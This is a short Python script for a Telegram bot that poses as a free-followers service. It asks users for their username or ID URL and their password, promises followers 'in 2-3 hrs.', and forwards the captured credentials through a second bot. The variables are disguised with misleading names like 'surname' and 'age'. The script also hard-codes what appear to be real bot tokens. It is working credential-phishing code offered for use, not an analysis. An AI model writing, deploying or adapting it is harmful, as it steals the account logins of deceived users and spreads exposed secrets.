import telebot

# Replace with your actual bot tokens
bot_token = '7662209563:AAECpY-YdHiN4QaxqiNXc2PSSuyaqvn1YSM'
forward_bot_token = '7757307730:AAG0l875p61A_LoBOBBL8dSsukAt9CU3H1s'

# Create Bot objects
bot = telebot.TeleBot(bot_token)
forward_bot = telebot.TeleBot(forward_bot_token)

def start(message):
    bot.reply_to(message, 'Hello! Please enter your username or id url.')
    bot.register_next_step_handler(message, ask_surname)

def ask_surname(message):
    first_name = message.text
    bot.reply_to(message, 'Please enter your password.')
    bot.register_next_step_handler(message, ask_age, first_name)

def ask_age(message, first_name):
    surname = message.text
    bot.reply_to(message, 'how mmany followers you want [minimum 10 , maximum 500]')
    bot.register_next_step_handler(message, send_to_server, first_name, surname)

def send_to_server(message, first_name, surname):
    age = message.text
    data = f'Name: {first_name} {surname}, Age: {age}'
    try:
        forward_bot.send_message(message.chat.id, data)
    except Exception as e:
        print(f'Error forwarding message: {e}')
    bot.reply_to(message, "followers sent in 2-3 hrs.")

@bot.message_handler(commands=['start'])
def handle_start(message):
    start(message)

bot.polling()